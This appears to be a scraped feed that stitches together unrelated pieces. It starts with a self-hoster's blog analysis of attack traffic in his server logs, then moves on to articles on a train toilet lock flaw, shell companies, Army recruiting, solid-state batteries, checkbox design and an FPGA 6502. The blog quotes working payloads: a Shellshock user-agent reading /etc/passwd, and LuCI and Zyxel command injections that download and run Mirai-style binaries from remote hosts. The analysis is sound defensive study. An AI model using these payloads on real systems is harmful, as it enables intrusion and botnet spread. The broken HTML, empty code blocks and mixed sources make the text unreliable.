                <p>I've been self-hosting for over a decade. It's freeing because I own my data, and do not depend on any platform other than my cloud host, which I can easily switch off. Self-hosting gives much insight into what it takes to run a cloud service. Anyone who's had some practice doing this will likely tell you that the internet is a dangerous place.</p><p>Exposing any IP onto the public internet immediately invites a flood of malicious traffic<sup><a href="#fn1" id="fnref1">[1]</a></sup>. While it's undesirable there's a lot to learn from this traffic so I poked through my access logs to see what sorts of attacks I've been hit with recently.</p>
<blockquote>
<p>Note: I'm not a security expert. I'm just a curious developer who likes to poke around so please take any assertions I make with a grain of salt. I wasn't sure what the value would be in redacting the IP addresses of bad guys but I redacted them anyway erring on the side of caution. Additionally, I've redacted some of the more colorful language used by the attackers which included.</p>

<h2 id="directory-traversal">Directory Traversal</h2>
<p>The most common attacks by a wide margin are directory traversal attacks in search of credentials. The most common appears to be in search of <code>.env</code> which usually contains application secrets.</p>

<p>Additionally, attackers are looking for other common files that contain credentials. In my sample, they seem to be looking for AWS credentials and configuration files, as well as Git repositories.</p>

</code></pre>
<p>Other attacks seem to be looking for common directories that may have been accidentally exposed by the administrator. I have to guess that the names are guesses based on common names. I'd be curious to learn more about what their success rate is. Interestingly, the user agents for these attacks mention <code>Mozlila/5.0</code> which as far as I can tell is a typo of <code>Mozilla/5.0</code>. A search on <a href="https://github.com/search?q=%22User-Agent%22%3A+%22Mozlila%2F5.0%22&amp;type=code&amp;ref=nishtahir.com">GitHub</a> (ignoring results attempting to block the user agent) hints that this is likely a typo that was made in a common tool that has been copied and pasted around<sup><a href="#fn2" id="fnref2">[2]</a></sup>.</p>

<p>The attackers also seem to be looking for common remote access and configuration tools.</p>

</code></pre>
<p>The lesson here seems to be to expose the absolute bare minimum to the public internet. If you don't need it, don't expose it. If you must expose tools or directories, add some layer of authentication and if possible restrict access to specific IP addresses because bad actors will be looking for it.</p>
<h2 id="shellshock">Shellshock</h2>
<p>Next, we've got a bunch of attacks that seem to be exploiting the Shellshock<sup><a href="#fn3" id="fnref3">[3]</a></sup> vulnerability.</p>
<pre><code>[24/Jan/2024:12:02:50 +0000] 200 - GET http xxx.xxx.xxx.xxx "/" [Client xxx.xxx.xxx.xxx] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36" "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"
</code></pre>
<p>This vulnerability exploits Webservers that execute CGI scripts with a vulnerable bash version by allowing an attacker to execute arbitrary commands<sup><a href="#fn4" id="fnref4">[4]</a></sup><sup><a href="#fn5" id="fnref5">[5]</a></sup>. When a CGI program starts, it sets environment variables with the content of the request, of note is <code>HTTP_USER_AGENT</code><sup><a href="#fn6" id="fnref6">[6]</a></sup>. When the characters <code>() { :; };</code> are included, bash interprets that as a function that needs to be executed.</p>
<p>In this specific attack, the bad guy sent this function as the user agent.</p>
<pre><code>() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
</code></pre>
<p>Let's break it down further.</p>
<ol>
<li>
<p><code>() { ignored; };</code>: This part defines a function in Bash. The content inside the curly braces is the function body. The ignored command is a placeholder; it doesn't affect the execution but was likely included to prevent syntax errors.</p>
</li>
<li>
<p><code>echo Content-Type: text/html; echo ;</code>: These commands are part of the function body. They set the Content-Type header of the HTTP response to "text/html" and echo an empty line.</p>
</li>
<li>
<p><code>/bin/cat /etc/passwd</code>: This is the malicious command embedded within the function. It attempts to use the <code>cat</code> command to display the contents of the <code>/etc/passwd</code> file, which contains user account information.</p>
</li>
</ol>
<p>If the attack was successful, the attacker would theoretically gain access to my user credentials as well as have a mechanism to execute arbitrary code on the server.</p>
<p>Like the directory traversal attack, the attacker guesses common directories and paths looking for an endpoint that responds favorably.</p>

<h2 id="luci-injection">LuCI Injection</h2>

</code></pre>
<p>This time we've got an attack that seems to be targeting the LuCI web interface for OpenWRT routers<sup><a href="#fn7" id="fnref7">[7]</a></sup>. The attack attempts to inject a command into the country field of a form that downloads and executes a shell script that is hosted remote server. Let's break it down.</p>
<p>The malicious code is in the URL which has been URL encoded. Decoding the URL makes it easier to read.</p>
<pre><code>/cgi-bin/luci/;stok=/locale?form=country&amp;operation=write&amp;country=$(cd /tmp; rm -rf *; wget http://xxx.xxx.xxx.xxx/tenda.sh; chmod 777 tenda.sh;./tenda.sh)
</code></pre>
<p>Breaking it down,</p>
<ol>
<li>
<p><code>/cgi-bin/luci/;stok=/locale</code>: This is the path to a CGI script in the LuCI interface. LuCI is a web-based interface for OpenWRT routers and similar embedded devices.</p>
</li>
<li>
<p><code>?form=country&amp;operation=write&amp;country=</code>: These are parameters passed to the CGI script.</p>
</li>
<li>
<p><code>$(cd /tmp; rm -rf *; wget http://xxx.xxx.xxx.xxx/tenda.sh; chmod 777 tenda.sh;./tenda.sh)</code>: This is a bash substitution command intended to be executed and the output is substituted into the URL. The command is trying to cd into the <code>/tmp</code> folder, delete all files, download a shell script from a remote server, and execute it.</p>
</li>
</ol>
<blockquote>
<p>Please do not try what I am about to do yourself. At this point in my investigation, I have no idea what the script contains or what it does. I'm taking a calculated risk and have taken measures to keep myself safe. If you're not sure what you're doing, attempting to do the same could cause you to end up with a compromised machine.</p>
</blockquote>
<p>Downloading the script to investigate further, I discovered that the attacker aimed to download and execute an additional binary.</p>

</code></pre>
<p>The binaries appear to be named after the architecture of the target device which makes sense since the attacker may not know what architecture the device is running on. This would give them the most surface area to work with. (Note: I censored names because the attacker renamed the binaries to common slurs)</p>
<p>I proceeded to download a binary incompatible with my environment as an additional precaution and installed Ghidra to investigate further. Looking through the binary only had 3 functions without a lot of string data. However, there was a large segment of data that looked like this.</p>

<p>This segment stood out indicating that it's an embedded ELF binary that has been packed with <a href="https://github.com/upx/upx?ref=nishtahir.com">UPX</a>. Some quick research indicated that it's often misused by malware authors to obfuscate and compress their binaries<sup><a href="#fn8" id="fnref8">[8]</a></sup>. As long as the malware author didn't modify the UPX header<sup><a href="#fn9" id="fnref9">[9]</a></sup> or packed binary, we should be able to use UPX to unpack the binary.</p>

<p>Success! We now have a lot more strings we can look at this time, which sheds a bit more light on what the malware was intended to do.</p>

</code></pre>
<p>What stands out this time is M-SEARCH with the ST header. This is a UPnP command looking for devices that support the DIAL protocol<sup><a href="#fn10" id="fnref10">[10]</a></sup> on the network. Based on the accompanying XML payload it looks like the malware is programmed to scan for Huawei devices on the network that are vulnerable to command injection. This appears to have been identified as being part of the Mirai botnet<sup><a href="#fn11" id="fnref11">[11]</a></sup>.</p>
<p>I tried to download the referenced <code>yeye.mips</code> however the file didn't appear to be available when I attempted to fetch it. Perhaps the file is only available at certain times of the day or only responds to certain headers or user agents? Running <code>nmap</code> on the server revealed that there were only 2 open ports</p>
<pre><code>nmap xxx.xxx.xxx.xxx
Nmap scan report for 25port.org (xxx.xxx.xxx.xxx)
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE   Service
22/tcp  open    ssh
646/tcp filtered    ldp
</code></pre>
<p>So this is where this journey came to an end.</p>
<h2 id="zyxel-injection">Zyxel Injection</h2>
<pre><code>[23/Jan/2024:17:56:29 +0000] 400 - GET http localhost "/bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*mips*;${IFS}wget${IFS}http://xxx.xxx.xxx.xxx/huhu.mips;${IFS}chmod${IFS}777${IFS}huhu.mips;${IFS}./huhu.mips${IFS}zyxel.selfrep;" [Client xxx.xxx.xxx.xxx] [Length 252] [Gzip -] "-" "-"
</code></pre>
<p>This time we have a shell command in the URL of a GET request. The command contains a bunch of <code>${IFS}</code> shell substitutions which we can clean up to make it easier to read.</p>
<pre><code>/bin/zhttpd/ cd /tmp; rm -rf *mips*; wget http://xxx.xxx.xxx.xxx/huhu.mips; chmod 777 huhu.mips; ./huhu.mips zyxel.selfrep;
</code></pre>
<p>This appears to be exploiting <code>zhttpd</code> which a quick search points out is an exploit available in Zyxel devices<sup><a href="#fn12" id="fnref12">[12]</a></sup>. Like the previous exploit, I decided to download the binary and poke around in Ghidra. Fortunately this time, the binary was not packed and as a result see what strings were contained to get a sense of what it was intended to do.</p>
<p>Looking through the strings a few items stood out.</p>

<p>Another DIAL protocol scan. Looking for vulnerable Huawei devices trying to download <code>huhu.mips</code> presumably as a form of self-replication.</p>
<pre><code>0042763c    POST /goform/set_LimitClient_cfg HTTP/1.1

</code></pre>
<p>Another standout was this command. which appear to be targetting routers according to <a href="https://www.akamai.com/blog/security-research/cve-2023-26801-exploited-spreading-mirai-botnet?ref=nishtahir.com">this</a> post by Akamai<sup><a href="#fn13" id="fnref13">[13]</a></sup></p>
<blockquote>
<p>To exploit this vulnerability, an attacker can send the following HTTP POST request to the "/goform/set_LimitClient_cfg" URL:<br>
...<br>
Ensure that the "Cookie" header is set to "user=admin" since the program has no special checks for authentication or authorization. This means that no prior authentication is required to exploit the vulnerability.</p>
</blockquote>
<p>At this point, we can conclude that this is likely an agent of the Mirai botnet. However, some sources also mention that it could be associated with the Linux Medusa<sup><a href="#fn14" id="fnref14">[14]</a></sup> as well.</p>
<h2 id="conclusion">Conclusion</h2>
<p>This is barely scratching the surface of my logs. There are dozens of other exploits that are being attempted daily I could poke through but this post has already gone long enough.</p>
<p>This experience does highlight the importance of keeping devices, especially IoT devices up to date, and if at all possible keep them off the public internet. If they must be exposed, keep them isolated as much as possible to their own VLAN.</p>

            <description><![CDATA[<p>URL: <a href="https://www.devever.net/~hl/traintoilet">https://www.devever.net/~hl/traintoilet</a>, See on <a href="https://news.ycombinator.com/item?id=39163797">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="nh">
          <main>
            <article><p>The other day I rode on a Class 800 train in the UK. This is the “Intercity
Express” train designed to replace the venerable HST (Intercity 125 with Mark 3
coaches, a train of which I have many memories and which I will dearly miss).</p>
<p>Modern trains in the UK have disabled toilets with power-operated doors. The
older models of these toilets had “open”, ”close” and “lock” buttons on the
inside, where you had to press “close”, wait for the door to close, and then
press ”lock”. There is no separate “unlock” button; pressing the “open” button
on the inside automatically unlocks and opens the door.</p>
<p>Of course, there is a reason for the separation of the closing and locking
functions, but not the opening and unlocking functions: it avoids a Denial of
Service attack where someone can just press “close” and then jump out before
the door closes. If the interior “close” button automatically locked the door,
this would result in the toilet becoming permanently inaccessible.</p>
<p>The problem with this design is that most people don't understand state
machines, and this design confused a lot of people who were unable to lock the
door correctly, or believed they'd locked the door when they hadn't.</p>
<figure>
<img src="https://www.devever.net/~hl/img/toilet_fsm.svg" alt="">
<figcaption>The toilet door controls state machine (on older trains)</figcaption>
</figure>

<p>As a result the newer disabled toilets on trains tend to have a lever you have
to move to lock the door:</p>
<figure>
<img src="https://www.devever.net/~hl/img/toilet_controls" alt="TODO">
<figcaption>Train disabled toilet interior controls (Class 800)</figcaption>
</figure>

<p>This design is an improvement since it is more intuitively comprehensible to
most people. Except of course, this lever isn't a “real” lever directly
connected to a locking mechanism but just some input to a microcontroller. This
raises the question of what happens when the state of the lever doesn't match
up with the state of the door and how the microcontroller deals with that.</p>
<p>Some models of train in the UK solve this robustly by having the lever spring
back to the “unlocked” position if you try to move it to the “locked” position
when the door is open. Presumably this lever-return mechanism is
electromagnetically activated whenever the door is in the wrong state for the
lever to be active.</p>
<p>Hitachi, however, have chosen a different strategy: a tiny metal pin is
projected whenever you should not be able to move the door handle from
“unlocked” to “locked”. This pin itself locks the lock handle in the unlocked
position.</p>
<p>The problem with this is that there is some play in the lever around when
exactly the microcontroller detects the lever as being in the “locked”
position. As such, you can close the door, then hold the lever just beyond the
point at which the locking pin could engage with it, but not to the point where
it reads as “locked”. Then you can open the door, but the locking pin projects
into thin air; thus the lever is free and can be moved to the locked position.
The door close button remains active and you can then close the door. I
confirmed that the door will then immediately lock as soon as the door is
closed. Since I could do this and then jump out before the door closes, this is
effectively a toilet DoS vulnerability on a train.</p>
<p><a href="https://www.youtube.com/watch?v=jaIDiwOQfSY">I've posted a video here where I demonstrate this issue.</a></p>
<p>You can also see the locking pin in the image above. Ordinarily, it should not
be visible projected, but because I have the handle at the precise point where
the logic thinks it's in the unlocked position but far enough away from it that
the locking pin can't make contact, the locking pin has projected into air.</p>
<p>This is the second opportunity I've had to test this issue on the Class 800. On
this particular occasion when I was testing this vulnerability, I seem to have
actually confused the toilet door controller enough that it decided “screw
this” and went into out-of-order mode, which didn't happen the first and
previous time. The toilet was working again when I alighted from the train; I
have no idea if it reset automatically after some period or if someone on the
train reset it.</p>
<p>Amusingly this is not the first DoS vulnerability I've found on a train — but
that will have to wait for another article.</p>

<div id="readability-page-1" class="page"><div data-cy="articleContent" id="article-content"><p>Moody’s Analytics has found 21 million “red flags” associated with shell companies that could be used to enable financial crimes, from ancient directors to dubious addresses.</p><div>



<p>For instance, more than 2,200 companies have directors aged 123 years and above, despite the fact that the oldest known human lived to 122, said Richard Graham, a director at Moody’s Analytics, in&nbsp;<a href="https://www.moodys.com/web/en/us/about/insights/data-stories/kyc-innovation-shell-company-indicator.html" target="_blank" rel="noreferrer noopener">research</a>&nbsp;published Monday. One listed director — at 942 years old — would have been born in the 11th century.</p>



<p>Atypical directorship is just one of seven key behaviors highlighted in the research, including mass registration, dormancy and circular ownership. While new regulations across the world are looking to improve transparency at shell companies, there is still some way to go, with $1.6 trillion laundered annually, according to data from Moody’s Analytics.</p>



<p>“Organizations today face mounting complexity in understanding true ownership structures and detecting risky corporate relationships,” said Ted Datta, head of the financial crime compliance practice for Europe, Africa and Americas at Moody’s Analytics. “By detecting these discrepancies, we can equip investigators and analysts with the tools to better investigate fraud.”</p>



<p>Findings from its report included a China-based textile and clothing manufacturer that reported over $2 billion revenues in 2019, despite having only one employee. There’s also thousands of examples of directors below the age of five, and 22,000 entities with a registered address at Egypt’s pyramids. Meanwhile, one individual held 5,751 roles at 2,883 different entities.</p>



<p>The study looked at some 472 million companies in November. The country with the highest number of shell company risks was&nbsp;<a href="https://www.bloomberg.com/news/articles/2023-03-10/russian-money-laundering-of-war-profit-suspected-in-london-by-uk-law-enforcement" target="_blank" rel="noreferrer noopener">the UK</a>, with almost 5 million flags. Companies registered in the US had the most flags related to financial anomalies, at over 1.25 million. Panama is also a hotspot, with 47% of companies in the jurisdiction raising alarm, though the number of anonymous registrations dropped by half following the Panama Papers&nbsp;<a href="https://www.bloomberg.com/news/articles/2021-07-29/panama-law-firm-clients-targeted-in-u-s-tax-evasion-probe" target="_blank" rel="noreferrer noopener">investigations</a>.</p>



<p>While shell companies might have legitimate purposes, their opaqueness is often use to hide criminal financial activity, Moody’s Analytics said. Other red governance flags included jurisdictional risk, outlier ultimate beneficial ownership and financial anomalies, it said.</p></div><p>Subscribe to the CFO Daily newsletter to keep up with the trends, issues, and executives shaping corporate finance. <a href="https://www.fortune.com/newsletters/cfodaily?&amp;itm_source=fortune&amp;itm_medium=article_tout&amp;itm_campaign=cfo_daily" target="_self" rel="">Sign up</a> for free.</p></div></div>]]></description>

                            <p>The <a href="http://www.military.com/army">Army</a> is tossing its mandate for potential recruits to have a high school diploma or GED certificate to enlist in the service, in one of the most dramatic moves yet in the escalating <a href="https://www.military.com/join-armed-forces">recruiting</a> crisis hitting the entire Defense Department.</p>

<p>On Thursday, the service announced that individuals may enlist without those previously required education certifications if they ship to basic training this fiscal year, which ends Oct. 1.</p>

<p>Recruits must also be at least 18 years old and otherwise qualify for a job in the active-duty Army. They also must score at least a 50 on the Armed Services Vocational Aptitude Battery, or <a href="https://www.military.com/join-armed-forces/asvab">ASVAB</a>, an SAT-style quiz to measure a potential recruit's academic ability.</p>

<p>A 50 on the test is a relatively low score, with 31 being the minimum to qualify for service. Combat arms jobs such as infantrymen and cavalry scouts need only minimal scores to serve, while admin work such as a human resources specialist or public affairs require scores of 100 or higher.</p>

<p>Previously, the Army would allow people to enlist if they hadn't finished high school yet at the age of 17 with parental consent. Those recruits typically wouldn't ship to basic training until they completed school.</p>

<p>The change follows another shift in policy this week when the service <a href="https://www.military.com/daily-news/2022/06/23/army-relaxes-tattoo-rules-it-scrambles-new-recruits.html">relaxed its tattoo rules</a>, allowing potential recruits to enlist with tattoos on their hands and neck, which previously needed waivers.</p>

<p>The Army and its sister services <a href="https://www.military.com/daily-news/2022/05/13/bigger-bonuses-pentagons-top-weapon-combat-recruiting-crisis-troops-head-exits.html">have scrambled this year, offering increasingly generous benefits and policy tweaks</a> in an effort to improve recruiting numbers. The Army has hit 40% of its recruiting goals this year, with the struggle to fill the ranks seemingly so grim the Defense Department reduced its planned total force size because prior recruiting goals were out of reach.</p>

<p>Those challenges come amid a low unemployment rate and a competitive civilian job market, with employers offering increased wages and benefits even for entry-level jobs.</p>

Murray" data-page-title="Solid-State EV Batteries Now Face “Production Hell” - IEEE Spectrum"><p>Recent solid-state battery announcements by <a href="https://www.vw.com/en.html" rel="noopener noreferrer" target="_blank">Volkswagen</a> and <a href="https://www.quantumscape.com/" rel="noopener noreferrer" target="_blank">QuantumScape</a> are raising hopes in the electric-vehicle market, but automotive battery experts are warning that the road to widespread, solid-state success is still a long and arduous one. A single breakthrough, as if from above, is not likely to turn the whole industry on its nose anytime soon.  </p><p>“Solid-state is a great technology,” noted Bob Galyen, owner of <a href="https://galyenenergy.com/" rel="noopener noreferrer" target="_blank">Galyen Energy</a> and former chief technology officer for the Chinese battery giant <a href="https://www.catl.com/en/" rel="noopener noreferrer" target="_blank">Contemporary Amperex Technology Ltd</a>. (CATL). “But it’s going to be just like lithium-ion was in terms of the length of time it will take to hit the market. And lithium-ion took a long time to get there.”</p><p>“I haven’t seen cost numbers that are even close to competing with liquid-state, lithium-ion batteries.“ <strong>—Bob Galyen, Galyen Energy </strong></p><p>Galyen and other experts consulted by <em>IEEE</em><em>Spectrum </em>noted that recent announcements by <a href="https://www.volkswagen-group.com/en/press-releases/powerco-confirms-results-quantumscapes-solid-state-cell-passes-first-endurance-test-18031" target="_blank">Volkswagen</a>, <a href="https://finance.yahoo.com/news/quantumscape-millionaire-maker-103600618.html" target="_blank">QuantumScape</a>, <a href="https://www.reuters.com/business/autos-transportation/toyota-roll-out-solid-state-battery-evs-couple-years-india-executive-says-2024-01-11/" target="_blank">Toyota</a>, and <a href="https://www.pcmag.com/news/semi-solid-state-battery-powers-chinese-evs-650-mile-14-hour-drive" target="_blank">NIO</a> have resulted in impressive <a href="https://www.wsj.com/livecoverage/stock-market-today-dow-jones-01-04-2024/card/quantumscape-stock-surges-40-after-battery-test-results-bSxt2jhJgDbsOiTrPp4X" rel="noopener noreferrer" target="_blank">stock market performance</a>. However, these same experts noted a pointed skepticism toward the technical merits of these announcements. None could isolate anything on the horizon indicating that solid-state technology can escape the engineering and “production hell” that lies ahead.</p><p>The remaining hurdles will involve validating existing solid-state battery technologies (currently in use for more limited, often medical, applications) for cars and trucks. The adoption curve, experts say, will depend on the product’s ability to be validated in terms of performance, life, and cost characteristics.</p><p>Solid-state cells, so-named for their use of a <a data-linked-post="2658810780" href="https://spectrum.ieee.org/solid-state-battery-pressure" target="_blank">solid electrolyte</a>, are seen as a key to the future of the <a href="https://spectrum.ieee.org/the-top-10-ev-battery-makers" target="_blank">electric car</a> because they potentially offer greater safety and energy, as well as much faster recharge times. Solid-state cells differ from conventional lithium-ion batteries in their use of a <a href="https://spectrum.ieee.org/john-goodenough-glass-battery-news-hydroquebec" target="_blank">glass</a> or <a href="https://spectrum.ieee.org/ion-storage-systems-ceramic-electrolyte-news-solid-state-batteries" target="_blank">ceramic electrolyte</a>, instead of a liquid composed of lithium salts. Automakers are keen on solid-state batteries’ future, because the technology offers greater thermal stability than liquid-based batteries, thus allowing for substantially faster recharge, among other advantages.</p><p>Solid-state has also been the subject of recent announcements from battery manufacturers and mainstream automakers alike. In early January, Volkswagen Group’s <a href="https://www.powerco.de/" rel="noopener noreferrer" target="_blank">PowerCo SE</a> battery company <a href="https://www.volkswagen-group.com/en/press-releases/powerco-confirms-results-quantumscapes-solid-state-cell-passes-first-endurance-test-18031" rel="noopener noreferrer" target="_blank">said it tested lithium-metal cells</a> from <a href="https://www.quantumscape.com/" rel="noopener noreferrer" target="_blank">QuantumScape</a>, achieving 1,000 charging cycles with 95 percent of the cell’s capacity still intact. The company said in a statement that the cell’s life-performance was analogous to “an electric car that could drive more than 500,000 kilometers (300,000 miles) without any noticeable loss of range.”</p><p>“What happens when you’re driving down I-75 and you hit a big pit in the road? What kind of damage would be done to the solid-state matrix?” <strong>—Bob Galyen, Galyen Energy </strong></p><p>Similarly, Toyota announced in October that it <a href="https://spectrum.ieee.org/toyota-solid-state-battery" target="_self">plans to incorporate solid-state batteries</a> in an unnamed number of production vehicles by 2027. The automaker said it is targeting a 1,000-km (600-mile) range with 80 percent DC fast-charge in 10 minutes or less. In December, Chinese automaker <a href="https://www.nio.com/et7" rel="noopener noreferrer" target="_blank">NIO</a> also got in the game, saying it is introducing a 150-kilowatt-hour “semi-solid-state battery” that would theoretically offer a 1,000-km range as soon as this summer.</p><p>Experts were quick to point out, however, that NIO’s battery, made by <a href="http://www.solidstatelion.com/en/about/" rel="noopener noreferrer" target="_blank">WeLion New Energy Technology Co.</a>, is not solid-state. “This is in fact a fairly conventional NMC (nickel manganese cobalt) cell with a gel electrolyte that has been in production for 15 years and is typically referred to as lithium-polymer,” noted Sam Abuelsamid, principal research analyst for <a href="https://guidehouseinsights.com/" rel="noopener noreferrer" target="_blank">Guidehouse Insights</a>. “Technically the gel is considered a semi-solid because it has properties of both a solid and liquid. But in a cell, it lacks the properties of a true solid-state electrolyte.” Notably, he said, semi-solid-state cells can be punctured on impact, which is closer to the nature of a traditional lithium-ion battery—and in contrast with actual solid-state cells, which would fracture. He also noted that semi-solid-state cells, with a manganese spinel chemistry, were used on a <a href="https://www.cnet.com/roadshow/news/hyundai-goes-high-tech-with-sonata-its-first-hybrid/" rel="noopener noreferrer" target="_blank">Hyundai Sonata hybrid in 2009</a>.</p><h3>Engineering challenge</h3><p>The big challenge facing true solid-state cells, however, is the long climb to engineering validation. Galyen cites five “golden rules” of batteries–safety, performance, life, cost, and environmental–which must be met for solid-state cells to achieve industry-wide adoption.</p><p>The process is reminiscent of Elon Musk’s reference to “manufacturing hell” in 2018.</p><p>“Most of the solid-state battery companies fall short on at least three of the five golden rules,” he said. “I haven’t seen anyone publish life numbers that make any sense. And I haven’t seen cost numbers that are even close to competing with liquid-state, lithium-ion batteries.” Solid-state costs, he said, are about where conventional lithium-ion batteries were a decade ago.</p><p>Automakers also still need to verify the “performance rule” in three key areas–performance at temperature, performance at altitude, and performance under shock and vibration. Of those, Galyen said, shock and vibration are particularly concerning. “What happens when you’re driving down I-75 and you hit a big pit in the road?” he said. “What kind of damage would be done to the solid-state matrix?”</p><p>Automakers will not move to broad adoption until they are able to verify the new technology’s abilities in all those key areas, Galyen added. “None of these batteries have been validated yet,” he said. “So how do you plan on putting something into automotive production when it hasn’t been validated?”</p><p>Validation will take time, while automakers test factory-built cells in real-world conditions. To do that, manufacturers will first need to build battery factories, which could take two years, and then run a half-year of prototype products and distribute them to customers, who put them through their duty cycles. “Then you put the products into production and find out what your ‘gotchas’ are,” Galyen said of the inevitable problems.</p><p>The process is reminiscent of Elon Musk’s reference to “manufacturing hell” in 2018. Back then, Musk declared his company was about enter into six months of the so-called “hell” as it struggled to work out the kinks in its Model 3 production line. He told <a href="https://www.wsj.com/articles/elon-musks-trip-through-hell-inside-the-2018-scramble-to-avoid-the-collapse-of-tesla-11627660800" rel="noopener noreferrer" target="_blank">reporters at the time</a> that a flood, a tornado, or even a ship sinking anywhere on earth could disrupt his company’s plans.</p><p>Galyen said that such headaches are commonplace in manufacturing, but particularly so in battery production. “There’s not one battery I’ve ever seen that doesn’t have a ton of ‘gotchas,’” he said.</p><p>To do the build-out, production, and validation could easily take seven or more years, Galyen said.</p><h3>Science nearly ready</h3><p>Experts expect the science to keep evolving during that period. Today, there are numerous versions of solid-state batteries using everything from traditional graphite to silicon to lithium metal in the anode, and there are cathodes made from traditional NMC and nickel-rich materials.</p><p>Most experts assume that more time is needed to run the gauntlet of engineering validation, even for the biggest, most secretive companies.</p><p><span></span>Battery scientists are optimistic that the new breed of batteries can overcome two key drawbacks of conventional lithium-ion. First, they say, nickel-rich cathodes will enable the battery industry to use less cobalt in the cathode. Second, solid-state chemistries will enable battery makers to use lithium metal in the anode.</p><p>The ability to reduce cobalt in the cathode is important because cobalt is scarce, expensive, and <a href="https://www.washingtonpost.com/world/interactive/2023/ev-cobalt-mines-congo/" target="_blank">often mined in countries with weak labor laws</a>. And the ability to use lithium metal in the anode is important because it would boost energy density while promoting safety. Makers of liquid-based lithium-ion batteries currently don’t use lithium metal anodes due to fear of fires.</p><p>“This is why we started this (solid-state) journey in the first place–so we could use lithium metal,” noted <a href="https://sigarra.up.pt/feup/en/func_geral.formview?p_codigo=320005" target="_blank">Helena Braga</a>, an associate professor of engineering physics at the University of Porto, in Portugal, and a well-known researcher who worked with <a href="https://www.nobelprize.org/prizes/chemistry/2019/goodenough/facts/" target="_blank">Nobel Prize</a> winner <a href="https://spectrum.ieee.org/john-goodenough-tribute" target="_self">John Goodenough</a> on solid-state batteries a decade ago. Braga said she is confident that the new chemistries will be ready soon, if they are not already.</p><p>What’s unknown is how far along those chemistries may be within some of the big manufacturing companies that make few public pronouncements, such as <a href="https://www.lgchem.com/main/index" target="_blank">LG Chem</a> and <a href="https://www.byd.com/us" target="_blank">BYD</a>. Some of those companies may be farther along, but it’s hard to know because there is so little reliable information.</p><p>For now, most experts assume that more time is needed to run the gauntlet of engineering validation, even for the biggest, most secretive companies.</p><p>“Most of the companies have great hope that they’re going to achieve success with the five golden rules,” Galyen said. “And they expect it to happen in the next decade.”</p></div></div>]]></description>

        <p>As you can see, even the checkmark wasn’t always there. But one thing remained constant: checkboxes were square.</p>
        <p>Why square? Because that’s how you can tell them from radio buttons:</p>
        <figure>
<img src="https://tonsky.me/blog/checkbox/radiobuttons@2x.png?t=1706380903" width="600" height="620">        </figure>
        <p>Their distinguishing feature is a single choice. If you select one, everything else is de-selected.</p>
        <p>I’m not sure when the distinction between square/round was introduced, but it seems to already exist in the 90-s:</p>
        <figure>
<img src="https://tonsky.me/blog/checkbox/turbo_pascal@2x.png?t=1706380903" width="720" height="540"><figcaption>Turbo Pascal 7.0 (1992)</figcaption>        </figure>

        <p>And since then, every major operating system followed this tradition. From Windows 3.11:</p>
        <figure>

        <p>to Windows 11:</p>
        <figure>
<img src="https://tonsky.me/blog/checkbox/radio_windows_11@2x.png?t=1706380903" width="500" height="400"><figcaption>Windows 11 (2021)</figcaption>        </figure>
        <p>from Mac OS 4:</p>
        <figure>
<img src="https://tonsky.me/blog/checkbox/radio_mac_os_7.5@2x.png?t=1706380903" width="500" height="120"><figcaption>Mac OS 4 (1987)</figcaption>        </figure>
        <p>till macOS Sonoma:</p>
        <figure>

        <p>There was a brief confusion up until 1986 when Apple used rounded rectangles instead of circles:</p>
        <figure>
<img src="https://tonsky.me/blog/checkbox/radio_mac_os_3@2x.png?t=1706380903" width="500" height="200"><figcaption>Mac OS 3 (1986)</figcaption>        </figure>
        <p>but it was quickly resolved.</p>
        <p>The point is, every major OS vendor has been adhering to the convention that checkboxes are square and radio buttons are round.</p>
        <p>Then the Web came. And when I say Web, I mean CSS. And when I say CSS, I mean Flash and then JavaScript.</p>
        <p>You see, people on the Web think conventions are boring. That regular controls need to be reinvented and redesigned. They don’t believe there are any norms.</p>
        <p>That’s why it’s common to see radio buttons containing checkmarks:</p>
        <figure>

        <p>Or square radio buttons:</p>

        <p>Following the Web’s example, native apps introduced us to round checkboxes:</p>

        <p>Sometimes people just don’t make distinctions anymore. For example, here the first group is single-choice, while the second one is multiple-choice:</p>
        <figure>

        <p>How are people supposed to know?</p>

        <p>But despite all this chaos and temptation, operating system vendors knew better. To this day, they follow THE convention: checkboxes are square, radio buttons are round.</p>
        <p>Maybe it was part of their internal training. Maybe they had experienced art directors. Maybe it was just luck. I don’t know — it doesn’t really matter — but — somehow — they managed to stick to the convention.</p>
        <p>Until this day.</p>
        <p>Apple is the first major operating system vendor who had abandoned a four-decades-long tradition. Their new visionOS — for the first time in the history of Apple — will have round checkboxes.</p>

        <p>How should we even call these? Radio checks? Check buttons?</p>
        <p>Anyway, with Apple’s betrayal, I think it’s fair to say there’s no hope for this tradition to continue.</p>
        <p>I therefore officially announce 2024 to be the year when the square checkbox has finally died.</p>

  <p>The 6502 was the CPU in my first computer (an Apple II plus), as well as many other popular home computers of the late 1970s and 80s. It lived on well into the 1990s in game consoles and chess computers, mostly in its updated “65C02” CMOS version. Here’s a re-implementation of the 65C02 in an FPGA, in a pin-compatible format that lets you upgrade those old computers and games to 100 MHz clock rate!</p>
<h2 id="the-concept">The concept</h2>
<p>The idea of implementing a CPU core inside an FPGA is not new, of course. In fact, the CPU core I am using is not my own, but was developed as a 6502 core by Arlet Ottens, and extended to cover the 65C02 opcodes by Ed Spittles and David Banks. A big thank-you to Arlet, Ed, and Dave for developing the core and sharing it freely! Links to their original work are on the 
<a href="https://www.e-basteln.de/computing/65f02/65f02-links/">Files &amp; Links</a> page.</p>
<p>I packaged this in a Spartan-6 FPGA (with 64 kByte on-chip RAM), on a small circuit board which is just the size of a 40-pin dual inline package, with pins matching the 65C02 pinout. I added logic inside the FPGA which can access the external 65C02 bus with the correct timing, based on whatever clock is coming in from the host system. Inside the FPGA, the CPU core runs at 100 MHz. I dubbed this the “65F02”, where the “F” might stand for FPGA or for “Fast”. ;-)</p>

</figure>
